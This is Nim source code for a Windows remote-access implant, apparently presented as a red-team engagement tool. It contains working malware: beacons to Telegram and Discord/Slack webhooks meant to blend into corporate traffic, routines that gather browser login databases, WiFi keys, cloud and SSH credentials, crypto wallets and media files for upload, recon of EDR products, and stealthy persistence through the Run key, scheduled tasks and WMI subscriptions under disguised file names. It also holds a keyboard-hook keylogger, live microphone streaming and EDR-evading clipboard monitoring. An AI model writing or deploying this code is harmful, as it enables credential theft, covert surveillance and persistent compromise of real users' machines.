# to a Telegram bot. Useful for: passive notification even when
# the WSS channel is dark; a separate audit channel the engagement
# team can monitor; mobile push to the operator's phone.
#
# This is HTTPS-POST to api.telegram.org. Uses the stdlib
# httpclient (which already does TLS via OpenSSL when compiled
# with -d:ssl). The endpoint is a public HTTPS host, so it
# doesn't require the WSS tunnel — but that also means the
# Telegram bot token is visible to anyone who reverses the
# binary. Treat the bot as compromised.
const
  TELEGRAM_BOT  = ""  # e.g. "123456:ABCDEF..."  (leave empty to disable)
  TELEGRAM_CHAT = ""  # e.g. "-1001234567890"    (chat or channel id)

proc telegramEnabled(): bool =
  TELEGRAM_BOT.len > 0 and TELEGRAM_CHAT.len > 0

proc telegramSend(text: string): bool =
  # Synchronous POST. Returns true on 200.
  if not telegramEnabled(): return false
  try:
    let url = "https://api.telegram.org/bot" & TELEGRAM_BOT & "/sendMessage"
    let client = newHttpClient()
    client.headers = newHttpHeaders({
      "Content-Type": "application/json"
    })
    let body = $ %* {
      "chat_id": TELEGRAM_CHAT,
      "text": text,
      "parse_mode": "HTML",
      "disable_web_page_preview": true
    }
    let resp = client.post(url, body)
    return resp.status == "200 OK" or resp.status.startsWith("200")
  except: return false

# ------------------------------------------------------------
# DISCORD / SLACK WEBHOOK BEACON CHANNEL
# ------------------------------------------------------------
# When configured (CLOUD_WEBHOOK_URL), the agent posts a small JSON
# beacon to a Discord or Slack incoming-webhook URL. This blends with
# normal corporate HTTPS traffic to discord.com / hooks.slack.com —
# both are extremely common in enterprise environments and rarely
# flagged by DLP / firewall rules.
#
# Discord payload format:  {"content": "message text"}
# Slack payload format:    {"text": "message text"}
# The agent auto-detects from the URL and uses the right field.
# The webhook URL is obfuscated at compile time so it doesn't appear
# as a plaintext string in the binary.
const
  S_WEBHOOK_URL = encodeObf("")  # e.g. encodeObf("https://hooks.slack.com/services/T.../B.../...")
  # Leave empty to disable. The URL is BOTH the destination AND the
  # auth token — anyone who has it can post to the channel. Treat it
  # as a compromised credential.

proc webhookEnabled(): bool =
  obfDec(S_WEBHOOK_URL).len > 0

proc webhookSend(text: string): bool =
  if not webhookEnabled(): return false
  try:
    let url = obfDec(S_WEBHOOK_URL)
    if url.len == 0: return false
    let isDiscord = contains(url, "discord.com")
    let body = if isDiscord:
      $ %* {"content": text}
    else:
      $ %* {"text": text}
    let client = newHttpClient(timeout = 15000)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})
    let resp = client.post(url, body)
    return resp.status.startsWith("200") or resp.status.startsWith("204")
  except: return false

# ------------------------------------------------------------
# DATA EXFIL: browser, WiFi, cloud tokens, SSH, media, wallet
# ------------------------------------------------------------
when defined(windows):
  # All output goes into a temporary staging dir; the agent then
  # uploads via the existing downloadFile() / file_chunk pipeline.
  proc stageDir(): string =
    result = getEnv("TEMP", expandTilde("~")) / obfDec(S_SVC_DIR)
    createDir(result)

  proc copyFileTo(src, dst: string): bool =
    try:
      createDir(dst.parentDir)
      copyFile(src, dst)
      return true
    except: return false

  proc exfilBrowserData(): JsonNode =
    # Find Chrome, Edge, Firefox user data dirs. Stage the relevant
    # SQLite files (History, Login Data, Cookies, Web Data,
    # Bookmarks, Local State) plus the encryption key in Local State
    # (used to decrypt Login Data on the server side).
    # The agent does NOT decrypt the cookies/passwords here — that
    # needs the Local State AES key plus a DPAPI master key, which
    # is a different operation per-user. We upload the raw DBs and
    # the operator runs a decoder (e.g. ChromeDecryptor, hack-browser-data).
    let dst = stageDir() / "browser"
    createDir(dst)
    var copied: seq[string] = @[]
    let profileDirs = [
      ("Google\\Chrome\\User Data", obfDec(S_CHROME)),
      ("Microsoft\\Edge\\User Data", obfDec(S_EDGE))
    ]
    let localApp = getEnv(obfDec(S_LOCALAPPDATA), expandTilde("~"))
    for (sub, name) in profileDirs:
      let base = localApp / sub
      if not dirExists(base): continue
      for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
        let pdir = base / profile
        if not dirExists(pdir): continue
        for dbName in ["History", "Login Data", "Cookies", "Web Data", "Bookmarks"]:
          let src = pdir / dbName
          if fileExists(src):
            if copyFileTo(src, dst / profile / dbName):
              copied.add(profile & "/" & dbName)
        # Local State contains the encrypted master key
        let ls = base / profile / "Local State"
        if fileExists(ls):
          discard copyFileTo(ls, dst / profile / "Local State")
        break  # one profile is enough; the operator can re-run for more
    return %* {
      "type": "exfil",
      "kind": "browser",
      "files": copied,
      "staging": dst,
      "count": copied.len
    }

  proc exfilWifiPasswords(): JsonNode =
    # `netsh wlan export profile folder=...` dumps each saved WiFi
    # profile to an XML file with the cleartext key (WPA2-PSK) or
    # the encrypted password (WPA3-Enterprise). We stage the XMLs.
    let dst = stageDir() / "wifi"
    createDir(dst)
    let netsh = obfDec(S_NETSH)
    let wlan = obfDec(S_WLAN)
    let prof = obfDec(S_PROFILE)
    let cmd = netsh & " " & wlan & " " & prof & " folder=\"" & dst & "\""
    discard execCmdEx(cmd, options = {poStdErrToStdOut})
    let files = walkFiles(dst / "*.xml").toSeq
    return %* {
      "type": "exfil",
      "kind": "wifi",
      "files": files,
      "staging": dst,
      "count": files.len
    }

  proc exfilCloudTokens(): JsonNode =
    # AWS, Azure, GCP, Git, Kubernetes. Staging only — we don't try
    # to call the APIs, we just lift the credentials so the operator
    # can use them.
    let dst = stageDir() / "cloud"
    createDir(dst)
    var copied: seq[string] = @[]
    let userProfile = getEnv(obfDec(S_USERPROFILE), expandTilde("~"))
    let pairs = [
      (userProfile / obfDec(S_AWS) / obfDec(S_AWS_CREDS), "aws_credentials"),
      (userProfile / obfDec(S_AWS) / "config", "aws_config"),
      (userProfile / obfDec(S_GCONFIG) / obfDec(S_GCLOUD) / "credentials", "gcp_credentials"),
      (userProfile / obfDec(S_AZ), "azure"),
      (userProfile / obfDec(S_GIT), "git_credentials"),
      (userProfile / obfDec(S_KUBE) / "config", "kubeconfig")
    ]
    for (src, label) in pairs:
      if fileExists(src):
        if copyFileTo(src, dst / label):
          copied.add(label)
    return %* {
      "type": "exfil",
      "kind": "cloud",
      "files": copied,
      "staging": dst,
      "count": copied.len
    }

  proc exfilSshKeys(): JsonNode =
    # %USERPROFILE%\.ssh\id_*  + known_hosts + config
    let dst = stageDir() / "ssh"
    createDir(dst)
    var copied: seq[string] = @[]
    let ssh = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_SSH_DIR)
    if dirExists(ssh):
      for f in walkFiles(ssh / "*"):
        let name = f.extractFilename
        if name.startsWith(obfDec(S_ID_RSA)) or
           name == obfDec(S_KH) or
           name == "config" or
           name.endsWith(".pub"):
          if copyFileTo(f, dst / name):
            copied.add(name)
    return %* {
      "type": "exfil",
      "kind": "ssh",
      "files": copied,
      "staging": dst,
      "count": copied.len
    }

  proc exfilMediaFiles(): JsonNode =
    # Find existing audio/video files on disk. This is exfiltration
    # of files the user already created — not surveillance.
    # We walk the user's profile and a few known media dirs and
    # stage anything with a media extension under a per-MB cap.
    let dst = stageDir() / "media"
    createDir(dst)
    let mediaExts = ["mp3","wav","m4a","flac","ogg","wma","mp4","mkv",
                     "avi","mov","wmv","webm","m4v","3gp","aac","opus"]
    var copied: seq[string] = @[]
    var totalBytes: int64 = 0
    const cap = 500 * 1024 * 1024  # 500 MB cap per exfil
    let roots = @[
      getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Videos",
      getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Music",
      getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Downloads",
      getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Documents"
    ]
    for root in roots:
      if not dirExists(root): continue
      try:
        for f in walkFiles(root):
          let ext = f.splitFile.ext.toLowerAscii
          if ext in mediaExts and totalBytes < cap:
            let sz = getFileSize(f).int64
            if sz > 100 * 1024 * 1024: continue  # skip > 100 MB files
            if totalBytes + sz > cap: break
            let name = f.extractFilename
            if copyFileTo(f, dst / name):
              copied.add(name)
              totalBytes += sz
      except: discard
    return %* {
      "type": "exfil",
      "kind": "media",
      "files": copied,
      "staging": dst,
      "count": copied.len,
      "bytes": totalBytes
    }

  proc exfilWalletData(): JsonNode =
    # MetaMask extension data, Ethereum keystore, Bitcoin core.
    # These are the most-commonly-stolen "loot" files.
    let dst = stageDir() / "wallet"
    createDir(dst)
    var copied: seq[string] = @[]
    let userProfile = getEnv(obfDec(S_USERPROFILE), expandTilde("~"))
    let localApp = getEnv(obfDec(S_LOCALAPPDATA), expandTilde("~"))
    let pairs = [
      (userProfile / obfDec(S_ETHEREUM) / obfDec(S_ETH_KEYSTORE), "eth_keystore"),
      (userProfile / obfDec(S_ETHEREUM) / "keystore", "eth_keystore2"),
      (userProfile / obfDec(S_BITCOIN) / "wallet.dat", "btc_wallet"),
      (localApp / obfDec(S_CHROME) / obfDec(S_DEFAULT_DIR) / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"),
      (localApp / obfDec(S_EDGE) / obfDec(S_DEFAULT_DIR) / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask_edge")
    ]
    for (src, label) in pairs:
      if fileExists(src) or dirExists(src):
        try:
          if dirExists(src):
            # Tar-like copy: recurse
            for f in walkFiles(src):
              let rel = f.relativePath(src)
              if copyFileTo(f, dst / label / rel):
                copied.add(label & "/" & rel)
          else:
            if copyFileTo(src, dst / label):
              copied.add(label)
        except: discard
    return %* {
      "type": "exfil",
      "kind": "wallet",
      "files": copied,
      "staging": dst,
      "count": copied.len
    }

  proc exfilRecentFiles(): JsonNode =
    # %APPDATA%\Microsoft\Windows\Recent\*.lnk — Jump lists reveal
    # what the user has been opening. Stage them all.
    let dst = stageDir() / "recent"
    createDir(dst)
    let recentDir = getEnv(obfDec(S_APPDATA), expandTilde("~")) /
                    "Microsoft\\Windows\\Recent"
    var copied: seq[string] = @[]
    if dirExists(recentDir):
      for f in walkFiles(recentDir / "*.lnk"):
        if copyFileTo(f, dst / f.extractFilename):
          copied.add(f.extractFilename)
    return %* {
      "type": "exfil",
      "kind": "recent",
      "files": copied,
      "staging": dst,
      "count": copied.len
    }

  proc exfilWinCreds(): JsonNode =
    # Use vaultcmd /list (built into Windows) to enumerate the
    # Windows Credential Manager. We can't read the secrets without
    # running as the user, but the NAMES + target types are gold
    # for the operator ("\\TERMSRV/Srv01", "MicrosoftAccount:...",
    # "EnterpriseCreds:..." etc).
    try:
      let (outp, code) = execCmdEx("vaultcmd /listcreds:\"Windows Credentials\" /all",
                                   options = {poStdErrToStdOut})
      let dst = stageDir() / "wincreds.txt"
      writeFile(dst, outp)
      return %* {"type": "exfil", "kind": "wincreds", "staging": dst,
                 "count": outp.splitLines.len, "exit": code}
    except:
      return %* {"type": "exfil", "kind": "wincreds", "error": getCurrentExceptionMsg()}

# ------------------------------------------------------------
# RECON: EDR detection, network shares, software + patches, USB
# ------------------------------------------------------------
when defined(windows):
  proc reconEdrAv(): JsonNode =
    # Look for common EDR / AV product strings in running processes
    # and loaded services. The operator uses this to decide if the
    # host is "hot" (CrowdStrike) or "cold" (Defender only).
    let indicators = [
      obfDec(S_EDR_1), obfDec(S_EDR_2), obfDec(S_EDR_3), obfDec(S_EDR_4),
      obfDec(S_EDR_5), obfDec(S_EDR_6), obfDec(S_EDR_7), obfDec(S_EDR_8),
      obfDec(S_EDR_9), obfDec(S_EDR_10), obfDec(S_EDR_11), obfDec(S_EDR_12),
      obfDec(S_EDR_13), obfDec(S_EDR_14), obfDec(S_EDR_15), obfDec(S_EDR_16),
      obfDec(S_EDR_17), obfDec(S_EDR_18), obfDec(S_EDR_19), obfDec(S_EDR_20),
      obfDec(S_EDR_21), obfDec(S_EDR_22), obfDec(S_EDR_23)
    ]
    try:
      let (outp, _) = execCmdEx("tasklist /v /fo csv", options = {poStdErrToStdOut})
      var hits: seq[string] = @[]
      for line in outp.splitLines:
        let lower = line.toLowerAscii
        for ind in indicators:
          if lower.contains(ind.toLowerAscii):
            hits.add(ind)
      return %* {"type": "recon", "kind": "edr", "hits": deduplicate(hits, false)}
    except:
      return %* {"type": "recon", "kind": "edr", "error": getCurrentExceptionMsg()}

  proc reconNetShares(): JsonNode =
    # `net view` enumerates hosts on the same domain/workgroup that
    # the user can see. `net share` enumerates local shares.
    # `net session` shows who has an SMB session to us.
    try:
      let (view, _) = execCmdEx("net view", options = {poStdErrToStdOut})
      let (share, _) = execCmdEx("net share", options = {poStdErrToStdOut})
      let (sess, _) = execCmdEx("net session", options = {poStdErrToStdOut})
      return %* {
        "type": "recon",
        "kind": "shares",
        "view": view,
        "share": share,
        "sessions": sess
      }
    except:
      return %* {"type": "recon", "kind": "shares", "error": getCurrentExceptionMsg()}

  proc reconSoftware(): JsonNode =
    # Installed software (HKLM\...\Uninstall) and the patch level
    # (wmic qfe). Patch level is a one-shot CVE relevance check.
    try:
      let (sw, _) = execCmdEx(
        "wmic product get name,version,vendor /format:list",
        options = {poStdErrToStdOut})
      let (patches, _) = execCmdEx(
        "wmic qfe list brief /format:list",
        options = {poStdErrToStdOut})
      let dst = stageDir() / "software.txt"
      writeFile(dst, sw & "\n=== PATCHES ===\n" & patches)
      return %* {
        "type": "recon",
        "kind": "software",
        "staging": dst,
        "products": sw.splitLines.filterIt(it.contains("Name=")).len,
        "patches": patches.splitLines.filterIt(it.contains("HotFixID=")).len
      }
    except:
      return %* {"type": "recon", "kind": "software", "error": getCurrentExceptionMsg()}

  proc reconUsbHistory(): JsonNode =
    # USB device history from the registry. Reveals physical access
    # patterns and is a fingerprint of who has touched the box.
    try:
      let (outp, _) = execCmdEx(
        "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\" /s",
        options = {poStdErrToStdOut})
      let (mounted, _) = execCmdEx(
        "reg query \"HKLM\\SYSTEM\\MountedDevices\"",
        options = {poStdErrToStdOut})
      let dst = stageDir() / "usb.txt"
      writeFile(dst, outp & "\n=== MOUNTED ===\n" & mounted)
      return %* {
        "type": "recon",
        "kind": "usb",
        "staging": dst,
        "devices": outp.splitLines.filterIt(it.contains("FriendlyName")).len
      }
    except:
      return %* {"type": "recon", "kind": "usb", "error": getCurrentExceptionMsg()}

  proc reconScheduledTasks(): JsonNode =
    # Local scheduled tasks. Operator reads these to find:
    #   - jobs that run as SYSTEM (privilege escalation)
    #   - jobs whose binary is writable (task hijack)
    #   - jobs that point at our implant (sanity check)
    try:
      let (outp, _) = execCmdEx("schtasks /query /fo LIST /v",
                                 options = {poStdErrToStdOut})
      let dst = stageDir() / "tasks.txt"
      writeFile(dst, outp)
      return %* {
        "type": "recon",
        "kind": "tasks",
        "staging": dst,
        "count": outp.splitLines.filterIt(it.contains("TaskName:")).len
      }
    except:
      return %* {"type": "recon", "kind": "tasks", "error": getCurrentExceptionMsg()}

# ------------------------------------------------------------
# ENCRYPTED META STORE (XOR + length, obfuscation not crypto)
# ------------------------------------------------------------
type
  MetaData = object
    regName: string
    taskName: string
    wmiSubName: string             # WMI permanent event subscription name
    copyPath: string
    installKey: array[32, byte]   # per-install random
    killDate: int64
    sleepMin: int
    lastContact: int64            # unix timestamp of last successful C2 contact

proc metaXor(data: openArray[byte], key: openArray[byte]): seq[byte] =
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor key[i mod key.len]

proc loadMeta(): MetaData =
  result = MetaData(killDate: DEFAULT_KILL_DATE, sleepMin: DEFAULT_SLEEP_MIN)
  try:
    if not fileExists(META_FILE): return
    let raw = readFile(META_FILE)
    let rawBytes = cast[seq[byte]](raw)
    if rawBytes.len < 32: return
    # First 32 bytes = install key (used to XOR the rest)
    for i in 0..<32: result.installKey[i] = rawBytes[i]
    let body = metaXor(rawBytes[32..<rawBytes.len], result.installKey)
    let j = parseJson(cast[string](body))
    if j.hasKey("reg"):   result.regName  = j["reg"].getStr()
    if j.hasKey("task"):  result.taskName = j["task"].getStr()
    if j.hasKey("wmi"):   result.wmiSubName = j["wmi"].getStr()
    if j.hasKey("copy"):  result.copyPath = j["copy"].getStr()
    if j.hasKey("kill"):  result.killDate = j["kill"].getInt()
    if j.hasKey("sleep"): result.sleepMin = j["sleep"].getInt()
    if j.hasKey("lc"):    result.lastContact = j["lc"].getInt()
  except: discard

proc saveMeta(meta: MetaData) =
  createDir(META_DIR)
  let body = $ %* {
    "reg":   meta.regName,
    "task":  meta.taskName,
    "wmi":   meta.wmiSubName,
    "copy":  meta.copyPath,
    "kill":  meta.killDate,
    "sleep": meta.sleepMin,
    "lc":    meta.lastContact
  }
  let bodyBytes = cast[seq[byte]](body)
  let bodyEnc = metaXor(bodyBytes, meta.installKey)
  var outp = newSeqOfCap[byte](32 + bodyEnc.len)
  for b in meta.installKey: outp.add(b)
  for b in bodyEnc: outp.add(b)
  writeFile(META_FILE, cast[string](outp))

# ------------------------------------------------------------
# PERSISTENCE
# ------------------------------------------------------------
proc establishPersistence() =
  let exePath = getAppFilename()
  var meta = loadMeta()
  let needSave = (meta.installKey[0] == 0)  # fresh install?

  if needSave:
    for i in 0..<32: meta.installKey[i] = rand(255).byte

  if meta.regName.len == 0:
    for _ in 0..<10: meta.regName.add(CHARSET[rand(CHARSET.high)])

  if meta.copyPath.len == 0:
    let appData = getEnv("APPDATA", expandTilde("~"))
    # Pick a name that doesn't scream "implant". "OneDrive<random>.exe"
    # is signatured by Defender — we rotate through a pool of plausible
    # Windows binary names instead. The random subdirectory is
    # APPDATA\\.<random>; legitimate Microsoft binaries sometimes
    # use a leading-dot folder.
    let LEGIT_NAMES = [
      obfDec(S_LEGIT_1), obfDec(S_LEGIT_2), obfDec(S_LEGIT_3), obfDec(S_LEGIT_4),
      obfDec(S_LEGIT_5), obfDec(S_LEGIT_6), obfDec(S_LEGIT_7), obfDec(S_LEGIT_8)
    ]
    let baseName = LEGIT_NAMES[rand(LEGIT_NAMES.high)]
    meta.copyPath = appData / "Microsoft" / ("." & randomToken(6)) / baseName

  # 1. Self-copy first (if not already at the target)
  try:
    if exePath != meta.copyPath:
      createDir(meta.copyPath.parentDir)
      if not fileExists(meta.copyPath):
        copyFile(exePath, meta.copyPath)
  except: discard

  # 2. Registry HKCU\...\Run pointing at the copy (idempotent)
  try:
    var key: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     newWideCString(r"Software\Microsoft\Windows\CurrentVersion\Run"),
                     0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
      let wPath = newWideCString(meta.copyPath)
      discard RegSetValueExW(key, newWideCString(meta.regName), 0, REG_SZ,
                             cast[ptr BYTE](wPath[0].addr),
                             DWORD((meta.copyPath.len + 1) * 2))
      discard RegCloseKey(key)
  except: discard

  # 3. Scheduled task pointing at the copy (uses the SAME copy path, not
  # the original exe — fixes the v1 bug).
  # Skip schtask for engagement+ variants: WMI permanent event
  # subscription (step 4) is quieter and covers the same trigger.
  when not (defined(variant_engagement) or defined(variant_aggressive)):
    try:
      let q = quoteShell(meta.copyPath)
      discard execCmdEx("schtasks /delete /tn \"" & meta.regName & "\" /f 2>nul",
                        options = {poStdErrToStdOut})
      discard execCmdEx("schtasks /create /tn \"" & meta.regName & "\" /tr " & q &
                        " /sc minute /mo 10 /f /rl LIMITED",
                        options = {poStdErrToStdOut})
      meta.taskName = meta.regName
    except: discard

  # 4. WMI permanent event subscription (engagement + aggressive only).
  # Quieter than HKCU Run + schtask — lives in the CIM repository, not
  # the registry or Task Scheduler. Triggers on user logon and re-runs
  # the agent copy. The subscription name is randomized and stored in
  # meta so selfCleanup can tear it down.
  when defined(variant_engagement) or defined(variant_aggressive):
    if meta.wmiSubName.len == 0:
      meta.wmiSubName = randomToken(12)
    try:
      # Single PowerShell invocation: creates filter + consumer + binding.
      # The filter fires on user logon (EventID 4624 — captures both
      # interactive and RDP). The consumer launches the hidden copy.
      # -WindowStyle Hidden so no console flashes; -NoProfile for speed.
      let escPath = meta.copyPath.replace("'", "''")
      let psCmd = "$f=New-Object Management.ManagementClass 'ROOT\\subscription','__EventFilter',$null;" &
        "$f.Name='" & meta.wmiSubName & "';" &
        "$f.QueryLanguage='WQL';" &
        "$f.Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType=2\";" &
        "$f|Set-WmiInstance;" &
        "$c=New-Object Management.ManagementClass 'ROOT\\subscription','CommandLineEventConsumer',$null;" &
        "$c.Name='" & meta.wmiSubName & "';" &
        "$c.CommandLineTemplate='" & escPath & "';" &
        "$c|Set-WmiInstance;" &
        "$b=New-Object Management.ManagementClass 'ROOT\\subscription','__FilterToConsumerBinding',$null;" &
        "$b.Filter='__EventFilter.Name=\"" & meta.wmiSubName & "\"';" &
        "$b.Consumer='CommandLineEventConsumer.Name=\"" & meta.wmiSubName & "\"';" &
        "$b|Set-WmiInstance"
      discard execCmdEx("powershell -NoProfile -WindowStyle Hidden -Command \"" & psCmd & "\"",
                        options = {poStdErrToStdOut, poEvalCommand})
      meta.taskName = meta.wmiSubName  # alias for the "persist ok" report
    except: discard

  if needSave: saveMeta(meta)

# ------------------------------------------------------------
# SELF-CLEANUP (kill command)
# ------------------------------------------------------------
proc selfCleanup() =
  let meta = loadMeta()
  # Registry
  try:
    var key: HKEY
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     newWideCString(r"Software\Microsoft\Windows\CurrentVersion\Run"),
                     0, KEY_SET_VALUE, addr key) == ERROR_SUCCESS:
      if meta.regName.len > 0:
        discard RegDeleteValueW(key, newWideCString(meta.regName))
      discard RegCloseKey(key)
  except: discard
  # Scheduled task
  if meta.taskName.len > 0:
    discard execCmdEx("schtasks /delete /tn \"" & meta.taskName & "\" /f 2>nul",
                      options = {poStdErrToStdOut})
  # WMI permanent event subscription (engagement + aggressive)
  when defined(variant_engagement) or defined(variant_aggressive):
    if meta.wmiSubName.len > 0:
      try:
        let psCleanup = "Get-WmiObject -Namespace ROOT\\subscription -Class __EventFilter | ? { $_.Name -eq '" & meta.wmiSubName & "' } | Remove-WmiObject -Force; " &
          "Get-WmiObject -Namespace ROOT\\subscription -Class CommandLineEventConsumer | ? { $_.Name -eq '" & meta.wmiSubName & "' } | Remove-WmiObject -Force; " &
          "Get-WmiObject -Namespace ROOT\\subscription -Class __FilterToConsumerBinding | ? { $_.Filter -like '*" & meta.wmiSubName & "*' } | Remove-WmiObject -Force"
        discard execCmdEx("powershell -NoProfile -WindowStyle Hidden -Command \"" & psCleanup & "\"",
                          options = {poStdErrToStdOut, poEvalCommand})
      except: discard
  # Meta file
  try: removeFile(META_FILE) except: discard
  # Best-effort: delete the copy. Skip if locked (AV scanning).
  if meta.copyPath.len > 0 and meta.copyPath != getAppFilename():
    try: removeFile(meta.copyPath) except: discard

# ------------------------------------------------------------
# KEYLOGGER (low-level keyboard hook — no GetAsyncKeyState polling)
# ------------------------------------------------------------
var
  keylogBuffer = ""
  keyloggerRunning = false
  keylogHook: HHOOK

proc vkToChar(vk: int32, shifted: bool): string =
  # Simple ASCII map; full keyboard layout is overkill for an implant
  if vk >= 0x30 and vk <= 0x39:
    if shifted:
      case vk
      of 0x30: return ")"
      of 0x31: return "!"
      of 0x32: return "@"
      of 0x33: return "#"
      of 0x34: return "$"
      of 0x35: return "%"
      of 0x36: return "^"
      of 0x37: return "&"
      of 0x38: return "*"
      of 0x39: return "("
      else: discard
    return $char(vk)
  if vk >= 0x41 and vk <= 0x5A:
    if shifted: return $char(vk)
    return $char(vk + 0x20)
  if vk == VK_SPACE: return " "
  if vk == VK_RETURN: return "\n"
  if vk == VK_TAB: return "\t"
  if vk == VK_BACK: return "[BKSP]"
  if vk == VK_ESCAPE: return "[ESC]"
  if vk == VK_OEM_PERIOD: return "."
  if vk == VK_OEM_COMMA: return ","
  return ""

proc utf8SafeTruncate(s: var string, maxLen: int) =
  # Truncate to at most maxLen bytes, but never split a multi-byte UTF-8
  # sequence. Walks back from the cut point until the byte at `i` is not
  # a continuation byte (0b10xxxxxx).
  if s.len <= maxLen: return
  var i = maxLen
  while i > 0 and (byte(s[i]) and 0xC0) == 0x80:
    dec i
  s = s[i .. ^1]

proc lowLevelKeyboardProc(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode == HC_ACTION and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
    let p = cast[ptr KBDLLHOOKSTRUCT](lParam)
    let vk = p.vkCode
    let shifted = (GetAsyncKeyState(VK_SHIFT) and 0x8000'i16) != 0
    let ch = vkToChar(vk, shifted)
    if ch.len > 0:
      keylogBuffer.add(ch)
      if keylogBuffer.len > KEYLOG_BUFFER_MAX:
        utf8SafeTruncate(keylogBuffer, KEYLOG_BUFFER_MAX div 2)
  result = CallNextHookEx(0, nCode, wParam, lParam)

proc keyloggerThread() {.thread.} =
  # A separate thread is required because the hook pump must run on a
  # thread that processes messages. We use a hidden message-only window
  # to keep the user from seeing a console window.
  let hInst = GetModuleHandle(nil)
  keylogHook = SetWindowsHookExW(WH_KEYBOARD_LL, lowLevelKeyboardProc,
                                  hInst, 0)
  # Pump messages until unhooked
  var msg: MSG
  while keyloggerRunning:
    let r = GetMessageW(addr msg, 0, 0, 0)
    if r <= 0: break
    discard TranslateMessage(addr msg)
    discard DispatchMessageW(addr msg)
  if keylogHook != 0:
    discard UnhookWindowsHookEx(keylogHook)
    keylogHook = 0

var keylogThreadVar: Thread[void]
var keylogThreadId: int = 0

# ------------------------------------------------------------
# MIC LIVE LISTEN  (operator -> listen <id> -> "voice call" stream)
# ------------------------------------------------------------
# Three pieces:
#   1. micListenCaptureThread — winmm polling on a dedicated thread,
#      pushes completed PCM buffers to a Lock-guarded queue.
#   2. micListenDrainTask     — async task (fire-and-forget) that
#      pops the queue and emits `file_chunk` messages to the C2.
#   3. The dispatcher's listen / unlisten branches set/clear the
#      micListenRunning flag and orchestrate teardown.
#
# Why split capture from send: winmm's `waveInAddBuffer` and
# `WHDR_DONE` polling are blocking and must run on a thread that
# doesn't share the event loop. The async event loop is the only
# thing that can `await sendToC2(...)`, so we hand buffers between
# the two via the queue.
var
  micListenRunning = false
  micListenLock: Lock
  # Live listen uses a single fixed-size ring of raw byte chunks
  # (allocated with `alloc`, no GC tracking). The capture thread
  # writes here, the main async loop reads. This sidesteps Nim's
  # GC-safety check on cross-thread seq[byte] access.
  micListenRing: ptr UncheckedArray[byte] = nil
  micListenRingCap: int = 0   # total bytes in the ring
  micListenRingHead: int = 0  # write offset (thread)
  micListenRingTail: int = 0  # read offset (main)
  micListenRingCount: int = 0 # bytes pending
  # Filename is a fixed-size byte array (not a GC string) so the
  # async drain task can read it without a gcsafe violation.
  micListenFilenameBuf: array[64, byte]
  micListenFilenameLen: int = 0
  micListenChunkIdx: int = 0
  micListenBufSize: int = 0
  micListenFormatKnown: bool = false
  micListenFormat: WAVEFORMATEX
  micListenHdr: array[MIC_BUF_COUNT, WAVEHDR]
  micListenBufs: array[MIC_BUF_COUNT, ptr UncheckedArray[byte]]
  micListenBufsLen: int = 0
  micListenHwi: HWAVEIN = 0
  micListenStalled: bool = false
  micListenStartedAt: MonoTime
var micListenThreadVar: Thread[void]

# ------------------------------------------------------------
# CLIPBOARD WATCH  (operator -> clipwatch <id> [interval_s])
# ------------------------------------------------------------
# Polling-based continuous clipboard monitor. The capture thread
# calls OpenClipboard + GetClipboardData on a timer (default 1.5s,
# configurable). New text is pushed into a raw ring buffer; an async
# drain task on the main event loop pops it and ships each capture
# as a `file_chunk` to the server.
#
# Why polling and not AddClipboardFormatListener: registering a
# clipboard listener is a sharp EDR signature (Defender for
# Endpoint, CrowdStrike flag processes that subscribe to clipboard
# events). A periodic OpenClipboard is "quieter" in telemetry.
#
# Design notes:
#   - Uses raw memory for the ring + lastText (same GC-safety
#     pattern as micListen). No GC types touched from the thread.
#   - Dedupe: identical-to-last capture is dropped. Avoids spamming
#     the operator when the user copies the same selection 10x.
#   - Size cap: CLIPWATCH_MAX_TEXT_BYTES per paste. Truncated pastes
#     get a [truncated] suffix so the operator knows.
#   - Format: CF_UNICODETEXT first, CF_TEXT fallback. Non-text
#     formats are recorded as a one-line marker (no binary exfil).
#   - One file per capture on the server side (clip_<ms>_<seq>.txt),
#     each containing a single timestamped paste. Easy to triage.
var
  clipwatchRunning = false
  clipwatchLock: Lock
  # Ring buffer (raw, no GC)
  clipwatchRing: ptr UncheckedArray[byte] = nil
  clipwatchRingCap: int = 0
  clipwatchRingHead: int = 0
  clipwatchRingTail: int = 0
  clipwatchRingCount: int = 0
  # Last captured text (UTF-8) for dedupe.
  clipwatchLastText: array[CLIPWATCH_MAX_TEXT_BYTES + 16, byte]
  clipwatchLastTextLen: int = 0
  clipwatchLastFormatId: int = 0   # 0 = none, 13 = CF_UNICODETEXT, 1 = CF_TEXT
  # Operational state
  clipwatchIntervalMs: int = CLIPWATCH_DEFAULT_MS
  clipwatchChunkIdx: int = 0
  clipwatchCaptureCount: int = 0
  clipwatchStartedAt: MonoTime
  clipwatchSkippedContention: int = 0  # diagnostic counter
  clipwatchStalled: bool = false
var clipwatchThreadVar: Thread[void]

proc getMicListenFilename(): string =
  # View into the fixed-size byte array, returned as a regular string
  # only for the duration of one expression (safe because nothing
  # else writes to the buffer while a single message is being
  # assembled by the drain task).
  result = newString(micListenFilenameLen)
  for i in 0..<micListenFilenameLen:
    result[i] = char(micListenFilenameBuf[i])

proc setMicListenFilename(s: string) =
  let n = min(s.len, micListenFilenameBuf.len - 1)
  for i in 0..<n: micListenFilenameBuf[i] = byte(s[i])
  micListenFilenameBuf[n] = 0
  micListenFilenameLen = n

proc startKeylogger() =
  if keyloggerRunning: return
  keyloggerRunning = true
  createThread(keylogThreadVar, keyloggerThread)
  # Best-effort capture of the thread id for PostThreadMessageW on stop
